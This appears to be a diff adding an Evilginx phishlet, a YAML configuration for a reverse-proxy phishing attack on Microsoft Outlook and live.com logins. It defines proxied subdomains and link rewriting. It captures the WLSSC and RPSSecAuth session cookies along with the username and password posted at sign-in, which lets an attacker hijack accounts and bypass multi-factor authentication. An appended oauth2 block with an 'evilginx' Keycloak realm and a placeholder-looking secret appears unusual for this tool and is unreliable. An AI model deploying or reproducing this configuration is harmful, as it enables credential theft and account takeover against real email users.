@@ -1,0 +1,45 @@
+author: '@mrgretzky'
+min_ver: '3.0.0'
+redirect_url: 'https://outlook.live.com/owa/'
+proxy_hosts:
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['WLSSC:always','RPSSecAuth:always']
+    type: 'cookie'
+auth_urls:
+  - '/owa/'
+  - '/owa/?nlp=1'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'outlook.live.com'
+  path: '/owa/?nlp=1'
+oauth2:
+  client_id: 'evilginx-proxy-outlook'
+  client_secret: 'a3b4c5d6e7f8901234567890abcdef1234567890abcdef1234567890abcdef1234'
+  redirect_uri: 'https://outlook.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
